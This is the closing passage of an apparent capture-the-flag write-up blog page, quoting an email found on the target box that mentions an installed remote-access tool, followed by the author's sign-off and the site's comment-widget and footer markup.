+</span></span><span class=line><span class=cl>Date: Thu, <span class=m>15</span> Jun <span class=m>2023</span> 09:08:55 +0000 <span class=o>(</span>UTC<span class=o>)</span>
+</span></span><span class=line><span class=cl>From: Dbile Admen &lt;root@pyrat&gt;
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>Hello jose, I wanted to tell you that i have installed the RAT you posted on your GitHub page, i<span class=s1>&#39;ll test it tonight so don&#39;</span>t be scared <span class=k>if</span> you see it running. Regards, Dbile Admen
+</span></span></code></pre></div><p>We have the information about RAT installed in the system.</p><p>Have a great day! I&rsquo;m wrapping up the blog here.</p></article><script type=text/javascript>(function(){const i=document.querySelector(".darkmode-toggle input"),s="light",n="dark";let a=localStorage.theme===n||!("theme"in localStorage)&&window.matchMedia("(prefers-color-scheme: dark)").matches,t=a?n:s;const e=document.createElement("script");e.type="text/javascript";const r={repo:"cyberjagadeesh/cyberjagadeesh.github.io",repoId:"R_kgDOMfA4MA",category:"General",categoryId:"DIC_kwDOMfA4MM4ChYzn",mapping:"url",reactionsEnabled:"1",emitMetadata:"0",theme:t,lang:"en"};e.src="https://giscus.app/client.js",e.crossorigin="anonymous",e.async=!0,Object.entries(r).forEach(function(t){return e.dataset[t[0]]=t[1]});const o=document.currentScript;o.parentNode.insertBefore(e,o);function c(e){const t=document.querySelector("iframe.giscus-frame");if(!t)return;t.contentWindow.postMessage({giscus:e},"https://giscus.app")}i.addEventListener("change",function(){this.checked?t=n:t=s,c({setConfig:{theme:t}})})})()</script></div></div></div></main><footer class="flex flex-none justify-center"><section class="flex flex-col md:flex-row mx-2 md:mx-0 gap-2 md:gap-0 justify-between w-full max-w-4xl lg:max-w-5xl py-6 text-slate-500 dark:text-slate-300"><div class="flex flex-row"><a href=https://www.linkedin.com/in/jagadeeshwaran-m-562a011b3 target=_blank title=LinkedIn class="flex flex-row mr-2"><span class=hidden>LinkedIn</span>
+<i class="h-6 w-6 flex-none"><svg class="icon icon-tabler icon-tabler-brand-linkedin" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M4 4m0 2a2 2 0 012-2h12a2 2 0 012 2v12a2 2 0 01-2 2H6a2 2 0 01-2-2z"/><path d="M8 11v5"/><path d="M8 8v.01"/><path d="M12 16v-5"/><path d="M16 16v-3a2 2 0 00-4 0"/></svg></i></a></div><div class=grow></div><div class="flex flex-row"><i class="h-6 w-6 flex-none"><svg class="icon icon-tabler icon-tabler-copyright" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M12 12m-9 0a9 9 0 1018 0A9 9 0 103 12"/><path d="M14 9.75a3.016 3.016.0 00-4.163.173 2.993 2.993.0 000 4.154A3.016 3.016.0 0014 14.25"/></svg>
+</i>2024 CyberJagadeesh</div></section></footer><script src=/main.min.c6372b6836971865bd94bfde974748aca8415824a2facab6ccd66a87384bfacb.js></script><div class="hidden top-1 right-1" id=code-copy><i class="h-6 w-6 block"><svg class="icon icon-tabler icon-tabler-copy" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667A2.667 2.667.0 019.667 7h8.666A2.667 2.667.0 0121 9.667v8.666A2.667 2.667.0 0118.333 21H9.667A2.667 2.667.0 017 18.333z"/><path d="M4.012 16.737A2.005 2.005.0 013 15V5c0-1.1.9-2 2-2h10c.75.0 1.158.385 1.5 1"/></svg></i></div><div class="hidden top-1 right-1" id=code-copy-done><i class="h-6 w-6 block"><svg class="icon icon-tabler icon-tabler-check" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M5 12l5 5L20 7"/></svg></i></div><script src=/code-copy.min.e7b2a74adef1ed474c335c8bd5e7832b2316b8842b0f9184d65286c5bd64f51a.js></script></body></html>
